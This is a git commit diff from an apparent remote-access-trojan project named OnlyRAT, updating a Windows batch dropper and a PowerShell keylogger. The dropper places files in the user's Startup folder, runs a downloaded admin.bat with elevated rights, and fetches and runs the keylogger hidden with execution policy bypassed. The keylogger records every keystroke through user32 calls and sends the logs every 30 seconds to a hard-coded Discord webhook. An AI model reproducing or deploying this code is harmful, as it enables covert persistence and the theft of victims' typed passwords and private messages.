0ade7c5e2fde4a47fe77c826456bc8da71e17151
Sayuru99 <saurudealwis@ymail.com>
2024-05-25 21:24:17 +0530

    update initial to download keylogger

--- initial.cmd
+++ initial.cmd
@@ -1,43 +1,22 @@
 @echo off
 
-REM Save the current directory
 set "initialPath=%cd%"
 
-REM Set the path for startup folder
 set "startup=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
 cd /d "%startup%"
 
+REM Download admin.bat from GitHub and run it with elevated privileges
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/admin/admin.bat', '%startup%\admin.bat')"
-
 powershell -c "Start-Process cmd.exe -ArgumentList '/c \"%startup%\admin.bat\"' -Verb RunAs"
 
-REM Wait for 10 seconds
-timeout /t 10 > nul
+REM Create a script to download the keylogger.ps1 file
+echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/keylogg.ps1' -OutFile 'keylogg.ps1'; Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"%startup%\keylogg.ps1\"' -WindowStyle Hidden" > down.cmd
 
-REM Check if the directory C:\NewDirectory exists, if not, create it
-powershell -Command "if (-not (Test-Path 'C:\NewDirectory')) { New-Item -Path 'C:\NewDirectory' -ItemType Directory }"
+REM Run the script to download the keylogger.ps1 file
+powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\down.cmd\"' -WindowStyle Hidden"
 
-REM Download the install.ps1 script to the startup location
-powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/mongodb/install.ps1', '%startup%\install.ps1')"
-
-REM Run the install.ps1 script as administrator
-powershell -ExecutionPolicy Bypass -NoProfile -Command "& '%startup%\install.ps1'"
-
-REM Import the Mdbc module
-powershell -Command "Import-Module Mdbc"
-
-REM Create wget.cmd script to download the keylogger.ps1 file
-echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/keylogger.ps1' -OutFile 'wget2.ps1'" > wget.cmd
-
-REM Run wget.cmd script to download the keylogger.ps1 file
-powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\wget.cmd\"' -WindowStyle Hidden"
-
-REM Wait for 5 seconds
-timeout /t 5 > nul
-
-REM Change directory back to the initial directory
 cd /d "%initialPath%"
 
-REM Optionally delete the initial.cmd file
+REM Delete the initial script if needed
 REM del initial.cmd
--- resources/keylogg.ps1
+++ resources/keylogg.ps1
@@ -1,9 +1,5 @@
-
 $discordWebhookUrl = "https://discord.com/api/webhooks/1243928007182385182/SCzOW4wzwv6jNNPR45QctapEh1kTGVKqSDBrxn7gAR0J4K-pXfbE1IIbW9VrsfVXL6T6"
-
-
 $keylogFilePath = "$env:temp\keylogs.txt"
-
 
 $APIsignatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
@@ -16,9 +12,7 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
-
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
-
 
 function Send-DiscordMessage {
     param (
@@ -37,7 +31,6 @@ function Send-DiscordMessage {
     }
 }
 
-
 function LogKeystrokesToFile {
     param (
         [string]$Content
@@ -51,15 +44,11 @@ function LogKeystrokesToFile {
     }
 }
 
-
 function SendKeylogsFromFile {
     try {
-        
         $keylogs = Get-Content -Path $keylogFilePath -Raw
         
-        
         Send-DiscordMessage -Content $keylogs
-        
         
         Remove-Item -Path $keylogFilePath -Force
     }
@@ -68,6 +57,14 @@ function SendKeylogsFromFile {
     }
 }
 
+function SendSmallMessage {
+    try {
+        Send-DiscordMessage -Content "No keystrokes recorded in the last 30 seconds."
+    }
+    catch {
+        Write-Host "Error occurred: $_"
+    }
+}
 
 function KeyLogger {
     $buffer = ""
@@ -75,45 +72,39 @@ function KeyLogger {
         Start-Sleep -Milliseconds 40
 
         for ($ascii = 9; $ascii -le 254; $ascii++) {
-            
             $keystate = $API::GetAsyncKeyState($ascii)
 
-            
             if ($keystate -eq -32767) {
                 $null = [console]::CapsLock
 
-                
                 $mapKey = $API::MapVirtualKey($ascii, 3)
 
-                
                 $keyboardState = New-Object Byte[] 256
                 $hideKeyboardState = $API::GetKeyboardState($keyboardState)
                 $loggedchar = New-Object -TypeName System.Text.StringBuilder
 
-                
                 if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
                     $buffer += $loggedchar
                 }
             }
         }
         
-        
         if ($buffer -match '\s+$') {
-            
             LogKeystrokesToFile -Content $buffer.Trim()
             $buffer = ""  
         }
         
-        
         if ((Get-Date) -ge $sendTime) {
-            SendKeylogsFromFile
+            if ([string]::IsNullOrEmpty($buffer)) {
+                SendSmallMessage
+            } else {
+                SendKeylogsFromFile
+            }
             $sendTime = (Get-Date).AddSeconds(30)  
         }
     }
 }
 
-
 $sendTime = (Get-Date).AddSeconds(30)
-
 
 KeyLogger
